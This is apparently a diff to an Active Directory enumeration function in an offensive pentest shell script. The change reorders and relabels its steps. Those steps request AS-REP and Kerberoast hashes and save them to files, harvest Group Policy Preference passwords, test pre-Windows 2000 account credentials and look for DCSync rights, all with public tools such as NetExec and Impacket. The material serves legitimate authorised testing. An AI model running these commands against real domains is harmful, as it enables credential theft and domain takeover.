@@ -448,6 +448,8 @@ enumdomain() {
     # Set a trap to clean up temporary files on exit
     trap "echo ''" INT
     
+    echo -e "\033[1;37m[\033[1;33m+\033[1;37m] Starting user & group enumeration... \033[0m"
+
     echo "\033[1;36m[?] Bruteforce RIDs? [y/N]\033[0m"
     read -s -q confirm
     if [[ $confirm =~ ^[Yy]$ ]]; then
@@ -457,72 +459,77 @@ enumdomain() {
       echo '\033[0;34m[*] Saving enumerated users to ./users.list'
     fi
     
-    echo "\033[1;36m[?] Enumerate all groups? [y/N]\033[0m"
-    read -s -q confirm
-    if [[ $confirm =~ ^[Yy]$ ]]; then
-      echo "\033[1;33m[!] Enumerating groups \033[0m"
-      echo "\033[0;34m[>] nxc smb $(echo "$nxc_auth") --groups \033[0m"
-      nxc smb $(echo "$nxc_auth") --groups 2>/dev/null | grep 'membercount' | tr -s " " | cut -d ' ' -f 5- | grep -v 'membercount: 0' | sed "s/membercount:/-/g"   
-    fi
+    echo "\033[1;33m[!] Enumerating groups \033[0m"
+    echo "\033[0;34m[>] nxc smb $(echo "$nxc_auth") --groups \033[0m"
+    nxc smb $(echo "$nxc_auth") --groups 2>/dev/null | grep 'membercount' | tr -s " " | cut -d ' ' -f 5- | grep -v 'membercount: 0' | sed "s/membercount:/-/g"   
+        
     
-    
-    echo "\033[1;33m[!] Enumerating privileged users with NetExec \033[0m"
+    echo "\033[1;33m[!] Enumerating privileged users \033[0m"
     echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") --admin-count \033[0m"
     nxc ldap $(echo "$nxc_auth") --admin-count 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5
     
-    echo "\033[1;33m[!] Enumerating user descriptions with NetExec \033[0m"
+    echo "\033[1;33m[!] Enumerating user descriptions \033[0m"
     echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") -M user-desc \033[0m"
     nxc ldap $(echo "$nxc_auth") -M user-desc 2>/dev/null | grep --color=never -o "User:.*"
     
-    echo "\033[1;33m[!] Searching for PKI Enrollment Services with NetExec \033[0m"
+    echo -e "\n\033[1;37m[\033[1;33m+\033[1;37m] Looking for exploitable accounts... \033[0m"
+
+    echo "\033[1;33m[!] Searching for AS-REProastable users \033[0m"
+    echo "\033[0;34m[>] GetNPUsers.py $(echo "$imp_auth") -request \033[0m"
+    GetNPUsers.py $(echo "$imp_auth") 2>/dev/null | grep --color=never "\S" | tail -n +4 | awk {'print $1'}
+    GetNPUsers.py $(echo "$imp_auth") -request -outputfile asrep.hash >/dev/null 2>&1
+    if [ -f ./asrep.hash ]; then
+        echo -e '\033[0;34m[*] Saving hashes to ./asrep.hash \033[0m'
+    fi
+    
+    echo "\033[1;33m[!] Searching for Kerberoastable users \033[0m"
+    echo "\033[0;34m[>] GetUserSPNs.py $(echo "$imp_auth") -request \033[0m"
+    GetUserSPNs.py $(echo "$imp_auth") 2>/dev/null | grep --color=never "\S" | tail -n +4 | awk {'print $2 " ||| "$1'} | column -s "|||" -t
+    GetUserSPNs.py $(echo "$imp_auth") -request -outputfile kerb.hash >/dev/null 2>&1
+    if [ -f ./kerb.hash ]; then
+        echo -e '\033[0;34m[*] Saving hashes to ./kerb.hash \033[0m'
+    fi
+    echo "\033[1;33m[!] Searching for PASSWD_NOTREQD flag \033[0m" 
+    echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") --password-not-required \033[0m"
+    nxc ldap $(echo "$nxc_auth") --password-not-required 2>/dev/null | grep --color=never -ao "User:.*"
+    
+    echo "\033[1;33m[!] Searching for pre-Win2k computer accounts\033[0m"
+    echo "\033[0;34m[>] pre2k unauth -d $domain -dc-ip $dc_ip -inputfile users.list \033[0m"
+    pre2k unauth -d $domain -dc-ip $dc_ip -inputfile users.list 2>/dev/null | grep -ioE "VALID CREDENTIALS: .*" --color=never
+    
+    echo -e "\n\033[1;37m[\033[1;33m+\033[1;37m] Looking for interesting domain configuration and services... \033[0m"
+
+    echo "\033[1;33m[!] Searching for PKI Enrollment Services \033[0m"
     echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") -M adcs \033[0m"
     nxc ldap $(echo "$nxc_auth") -M adcs 2>/dev/null | grep ADCS | tr -s " " | cut -d ' ' -f 6-
     
-    echo "\033[1;33m[!] Enumerating trust relationships with NetExec \033[0m"
-    echo "\033[0;34m[>] xc ldap $(echo "$nxc_auth") -M enum_trusts \033[0m"
+    echo "\033[1;33m[!] Enumerating trust relationships \033[0m"
+    echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") -M enum_trusts \033[0m"
     nxc ldap $(echo "$nxc_auth") -M enum_trusts 2>/dev/null | grep ENUM_TRUSTS | tr -s " " | cut -d ' ' -f 6-
     
     echo "\033[1;33m[!] Enumerating MachineAccountQuota \033[0m"
     echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") -M maq \033[0m"
     nxc ldap $(echo "$nxc_auth") -M maq 2>/dev/null | grep -oE "MachineAccountQuota: .*"
     
-    echo "\033[1;33m[!] Enumerating delegation rights with Impacket \033[0m"
+    echo "\033[1;33m[!] Enumerating delegation rights \033[0m"
     echo "\033[0;34m[>] findDelegation.py $(echo "$imp_auth") \033[0m"
     findDelegation.py $(echo "$imp_auth") 2>/dev/null | grep --color=never "\S" | tail -n +2
     
-    echo "\033[1;33m[!] Enumerating DCSync rights with NetExec \033[0m"  
+    echo "\033[1;33m[!] Enumerating DCSync rights \033[0m"  
     local domain1=$(echo $domain | cut -d '.' -f 1)
     local domain2=$(echo $domain | cut -d '.' -f 2)
     echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth")  -M daclread -o TARGET_DN="DC=$domain1,DC=$domain2" ACTION=read RIGHTS=DCSync \033[0m"
     nxc ldap $(echo "$nxc_auth")  -M daclread -o TARGET_DN="DC=$domain1,DC=$domain2" ACTION=read RIGHTS=DCSync 2>/dev/null | grep "Trustee" | cut -d ":" -f 2 | sed 's/^[[:space:]]*//'
     
-    echo "\033[1;33m[!] Searching for credentials in the GPO with NetExec \033[0m"
+    echo "\033[1;33m[!] Searching for credentials in the GPO \033[0m"
     echo "\033[0;34m[>] nxc smb $(echo "$nxc_auth") -M gpp_password -M gpp_autologin \033[0m"
     nxc smb $(echo "$nxc_auth") -M gpp_password 2>/dev/null | grep -aioE "Found credentials .*|userName: .*|Password: .*" --color=never
     nxc smb $(echo "$nxc_auth") -M gpp_autologin 2>/dev/null | grep -aioE "\Found credentials .*|Usernames: .*|Passwords: .*" --color=never
-    
-    echo "\033[1;33m[!] Enumerating PASSWD_NOTREQD with NetExec \033[0m" 
-    echo "\033[0;34m[>] nxc ldap $(echo "$nxc_auth") --password-not-required \033[0m"
-    nxc ldap $(echo "$nxc_auth") --password-not-required 2>/dev/null | grep --color=never -ao "User:.*"
-    
-    echo "\033[1;33m[!] Enumerating pre-Win2k computer accounts\033[0m"
-    echo "\033[0;34m[>] pre2k unauth -d $domain -dc-ip $dc_ip -inputfile users.list \033[0m"
-    pre2k unauth -d $domain -dc-ip $dc_ip -inputfile users.list 2>/dev/null | grep -ioE "VALID CREDENTIALS: .*" --color=never
-    
-    echo "\033[1;33m[!] Enumerating AS-REProastable users with Impacket \033[0m"
-    echo "\033[0;34m[>] GetNPUsers.py $(echo "$imp_auth") -request \033[0m"
-    GetNPUsers.py $(echo "$imp_auth") 2>/dev/null | grep --color=never "\S" | tail -n +4 | awk {'print $1'}
-    GetNPUsers.py $(echo "$imp_auth") -request -outputfile asrep.hash 1>/dev/null
-    echo '\033[0;34m[*] Saving hashes (if any) to ./asrep.hash \033[0m'
-    
-    echo "\033[1;33m[!] Enumerating Kerberoastable users with Impacket \033[0m"
-    echo "\033[0;34m[>] GetUserSPNs.py $(echo "$imp_auth") -request \033[0m"
-    GetUserSPNs.py $(echo "$imp_auth") 2>/dev/null | grep --color=never "\S" | tail -n +4 | awk {'print $2 " ||| "$1'} | column -s "|||" -t
-    GetUserSPNs.py $(echo "$imp_auth") -request -outputfile kerb.hash >/dev/null 2>&1
-    echo '\033[0;34m[*] Saving hashes (if any) to ./kerb.hash \033[0m'
         
+    echo -e "\n\033[1;37m[\033[1;33m+\033[1;37m] Starting data collection... \033[0m"
+
     echo "\033[1;36m[?] Ingest data for Bloodhound? [y/N] \033[0m"
-    read -s -q confirm
+    read -s -q -t 60 confirm
     if [[ $confirm =~ ^[Yy]$ ]]; then    
       echo "\033[1;33m[!] Ingesting AD data \033[0m"
       echo "\033[0;34m[*] Collection set to 'All'. Grab yourself a cup of coffee, this might take a wee while. \033[0m"
@@ -534,7 +541,7 @@ enumdomain() {
     fi
 
     trap - INT
-    echo "\033[1;31m[*] Done. \033[0m"
+    echo "\n\033[1;31m[*] Done. \033[0m"
 }
 
 # ENUMUSER
